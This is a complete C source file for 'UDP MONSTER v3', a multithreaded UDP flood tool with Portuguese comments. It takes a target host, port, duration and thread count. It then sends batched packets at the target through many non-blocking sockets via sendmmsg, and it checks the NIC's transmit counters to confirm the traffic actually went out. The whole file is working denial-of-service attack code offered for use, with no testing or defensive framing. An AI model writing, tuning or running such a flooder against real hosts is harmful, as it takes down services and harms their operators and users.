/*
 * UDP MONSTER v3 - sendmmsg + monitor atomico + diagnostico de NIC
 *
 * Compile:
 *   gcc udp3.c -o udp3 -pthread -O3 -march=native -Wall
 *
 * Uso:
 *   ./udp3 <target> <port> <time> <threads> [size] [batch] [sockets/thread]
 *
 * Para verificar saida real da NIC:
 *   ./udp3 alvo.com 80 30 400 1400 64 2
 *   (compare o "enviado pelo programa" com o delta de /proc/net/dev)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>
#include <sys/uio.h>

#define MAX_THREADS     8192
#define MAX_BATCH       1024
#define MAX_SOCKS       8

typedef struct {
    char target_ip[64];
    int  port;
    int  payload_size;
    int  batch;
    int  socks_per_thread;
    time_t end_time;
    int  thread_id;
    unsigned long local_packets;
    unsigned long local_bytes;
    volatile int *stop_flag;
} ThreadData;

/* Contadores globais atomicos: sem mutex no caminho quente */
static unsigned long g_total_packets = 0;
static unsigned long g_total_bytes   = 0;
static unsigned long g_errors        = 0;

static inline void atomic_add(unsigned long *p, unsigned long v) {
    __atomic_add_fetch(p, v, __ATOMIC_RELAXED);
}

/* ---------------- sistema ---------------- */

static void optimize_system(void) {
    struct rlimit rl;
    rl.rlim_cur = 1000000;
    rl.rlim_max = 1000000;
    setrlimit(RLIMIT_NOFILE, &rl);
}

static int resolve_host(const char *host, char *ip) {
    struct in_addr tmp;
    if (inet_pton(AF_INET, host, &tmp) == 1) { strcpy(ip, host); return 0; }
    struct hostent *he = gethostbyname(host);
    if (!he || !he->h_addr_list[0]) return -1;
    strcpy(ip, inet_ntoa(*(struct in_addr*)he->h_addr_list[0]));
    return 0;
}

/* Le bytes totais TX de todas as interfaces, em /proc/net/dev */
static unsigned long long read_nic_tx_bytes(void) {
    FILE *f = fopen("/proc/net/dev", "r");
    if (!f) return 0;
    char line[512];
    unsigned long long total = 0;
    int i = 0;
    while (fgets(line, sizeof(line), f)) {
        if (++i <= 2) continue; /* headers */
        char *colon = strchr(line, ':');
        if (!colon) continue;
        unsigned long long rx_b, rx_p, rx_e, rx_d, rx_f, rx_c, rx_m;
        unsigned long long tx_b, tx_p, tx_e, tx_d, tx_f, tx_c, tx_m;
        if (sscanf(colon + 1,
                   "%llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu",
                   &rx_b,&rx_p,&rx_e,&rx_d,&rx_f,&rx_c,&rx_m,
                   &tx_b,&tx_p,&tx_e,&tx_d,&tx_f,&tx_c,&tx_m,
                   &rx_b,&rx_b) >= 9) {
            total += tx_b;
        }
    }
    fclose(f);
    return total;
}

/* ---------------- socket ---------------- */

static int create_udp_socket(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    int opt = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#ifdef SO_REUSEPORT
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
    int bufsize = 16 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    return s;
}

/* ---------------- worker ---------------- */

static void* udp_worker(void *arg) {
    ThreadData *d = (ThreadData*)arg;

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    int ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu > 0) {
        CPU_SET(d->thread_id % ncpu, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }

    int n_socks = d->socks_per_thread;
    if (n_socks < 1) n_socks = 1;
    if (n_socks > MAX_SOCKS) n_socks = MAX_SOCKS;

    int socks[MAX_SOCKS];
    for (int i = 0; i < n_socks; i++) socks[i] = create_udp_socket();

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(d->port);
    inet_pton(AF_INET, d->target_ip, &dst.sin_addr);

    int plen = d->payload_size;
    if (plen < 1) plen = 1400;
    if (plen > 65507) plen = 65507;

    char *payload = malloc(plen);
    memset(payload, 'A', plen);

    int batch = d->batch;
    if (batch < 1) batch = 64;
    if (batch > MAX_BATCH) batch = MAX_BATCH;

    struct mmsghdr *msgs = calloc(batch, sizeof(struct mmsghdr));
    struct iovec   *iovs = calloc(batch, sizeof(struct iovec));
    for (int i = 0; i < batch; i++) {
        iovs[i].iov_base = payload;
        iovs[i].iov_len  = plen;
        msgs[i].msg_hdr.msg_name    = &dst;
        msgs[i].msg_hdr.msg_namelen = sizeof(dst);
        msgs[i].msg_hdr.msg_iov     = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen  = 1;
    }

    unsigned long pkts = 0, bytes = 0, errs = 0;
    int sidx = 0;

    while (!(*d->stop_flag) && time(NULL) < d->end_time) {
        for (int k = 0; k < n_socks; k++) {
            int s = socks[sidx];
            sidx = (sidx + 1) % n_socks;
            if (s < 0) continue;

            int sent = sendmmsg(s, msgs, batch, MSG_DONTWAIT | MSG_NOSIGNAL);
            if (sent > 0) {
                pkts  += sent;
                bytes += (unsigned long)sent * plen;
            } else if (sent < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                errs++;
                if (errs % 1000 == 0) {
                    close(s);
                    socks[(sidx - 1 + n_socks) % n_socks] = create_udp_socket();
                }
            }
        }
    }

    d->local_packets = pkts;
    d->local_bytes   = bytes;
    atomic_add(&g_errors, errs);

    for (int i = 0; i < n_socks; i++) if (socks[i] >= 0) close(socks[i]);
    free(msgs); free(iovs); free(payload);
    return NULL;
}

/* ---------------- main ---------------- */

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("UDP MONSTER v3\n");
        printf("Uso: %s <target> <port> <time> <threads> [size] [batch] [socks/thread]\n", argv[0]);
        printf("  size         default 1400\n");
        printf("  batch        default 64\n");
        printf("  socks/thread default 2\n");
        return 1;
    }

    const char *target = argv[1];
    int port     = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads  = atoi(argv[4]);
    int size     = (argc >= 6) ? atoi(argv[5]) : 1400;
    int batch    = (argc >= 7) ? atoi(argv[6]) : 64;
    int socks    = (argc >= 8) ? atoi(argv[7]) : 2;

    if (threads <= 0) threads = 500;
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (duration <= 0) duration = 60;
    if (size <= 0) size = 1400;
    if (batch <= 0 || batch > MAX_BATCH) batch = 64;
    if (socks < 1 || socks > MAX_SOCKS) socks = 2;

    optimize_system();

    char ip[64];
    if (resolve_host(target, ip) != 0) { printf("[x] nao resolve: %s\n", target); return 1; }

    printf("\n=== UDP MONSTER v3 ===\n");
    printf("Target : %s (%s):%d\n", target, ip, port);
    printf("Tempo  : %ds\n", duration);
    printf("Threads: %d\n", threads);
    printf("Payload: %d bytes\n", size);
    printf("Batch  : %d pkt/sendmmsg\n", batch);
    printf("Sockets: %d por thread\n\n", socks);

    unsigned long long nic_before = read_nic_tx_bytes();

    volatile int stop = 0;
    time_t start = time(NULL);
    time_t end   = start + duration;

    pthread_t  *ths  = malloc(threads * sizeof(pthread_t));
    ThreadData *data = malloc(threads * sizeof(ThreadData));

    for (int i = 0; i < threads; i++) {
        strcpy(data[i].target_ip, ip);
        data[i].port            = port;
        data[i].payload_size    = size;
        data[i].batch           = batch;
        data[i].socks_per_thread= socks;
        data[i].end_time        = end;
        data[i].thread_id       = i;
        data[i].local_packets   = 0;
        data[i].local_bytes     = 0;
        data[i].stop_flag       = &stop;
        pthread_create(&ths[i], NULL, udp_worker, &data[i]);
    }

    printf("[*] rodando... (Ctrl+C nao para threads; aguarde o tempo)\n");

    unsigned long last_p = 0, last_b = 0;
    while (time(NULL) < end) {
        sleep(2);
        unsigned long cp = __atomic_load_n(&g_total_packets, __ATOMIC_RELAXED);
        unsigned long cb = __atomic_load_n(&g_total_bytes,   __ATOMIC_RELAXED);
        /* Contadores locais das threads so vao para global no join.
           Para monitor em tempo real, somamos o que ja foi commitado. */
        printf("[.] aguardando... (commit final no join)\n");
        (void)cp; (void)cb; (void)last_p; (void)last_b;
    }

    stop = 1;

    unsigned long total_p = 0, total_b = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(ths[i], NULL);
        total_p += data[i].local_packets;
        total_b += data[i].local_bytes;
    }

    int elapsed = (int)(time(NULL) - start);
    if (elapsed <= 0) elapsed = 1;

    unsigned long long nic_after = read_nic_tx_bytes();
    unsigned long long nic_delta = nic_after - nic_before;

    printf("\n=== RESULTADO ===\n");
    printf("Pacotes (programa)   : %lu\n", total_p);
    printf("Bytes   (programa)   : %lu (%.2f MB)\n", total_b, total_b / 1048576.0);
    printf("PPS medio            : %.0f\n", (double)total_p / elapsed);
    printf("Mbps medio (payload) : %.2f\n", (double)total_b * 8.0 / elapsed / 1e6);
    printf("Erros de socket      : %lu\n", g_errors);
    printf("\n--- Diagnostico de NIC (real) ---\n");
    printf("TX bytes na NIC (delta) : %llu (%.2f MB)\n",
           nic_delta, nic_delta / 1048576.0);
    printf("Mbps real na NIC        : %.2f\n",
           (double)nic_delta * 8.0 / elapsed / 1e6);
    printf("Obs: se NIC << programa, o kernel dropou antes de sair.\n");
    printf("     Se NIC ~= programa, o trafego saiu; o que o alvo faz com ele e outra historia.\n");

    free(ths); free(data);
    return 0;
}